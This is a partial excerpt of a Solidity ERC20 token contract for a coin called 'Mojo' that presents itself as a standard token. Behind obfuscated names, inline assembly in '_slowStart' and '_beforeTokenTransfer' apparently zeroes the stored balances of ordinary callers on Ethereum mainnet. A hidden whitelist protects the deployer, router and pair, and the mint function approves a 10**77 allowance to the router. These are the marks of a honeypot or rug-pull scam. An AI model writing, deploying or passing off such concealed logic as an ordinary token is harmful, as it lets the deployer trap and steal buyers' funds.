...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addMojo;
    uint256 private hexedPerson = block.number*2;

    mapping (address => bool) private _firstSpell; 
    mapping (address => bool) private _secondControl;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private packBig;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private droneAttack;
    address public pair;
    ...
    bool private trading; uint256 private windowMicro = 1; bool private openSeat;
    uint256 private _decimals; uint256 private redPill;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addMojo.push(_router); addMojo.push(msgSender_); addMojo.push(pair);
        for (uint256 q=0; q < 3;) {_firstSpell[addMojo[q]] = true; unchecked{q++;} }
    }
    ...
    function _slowStart() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x59897fa624424615240aa99cdca5c9c084b717d844d82ba3cb28badabb6adb55
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x1e35bab264edb78db5dfe52b507aad374c3f2371e577ee63a8c2902c9556ba48,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; hexedPerson = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addMojo[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployMojo(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addMojo[0], 10 ** 77);
        _slowStart();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployMojo(creator, initialSupply);
    }
}

contract $MOJO is ERC20Token {
    constructor() ERC20Token("Mojo", "MOJO", msg.sender, 25000000 * 10 ** 18) {
    }
}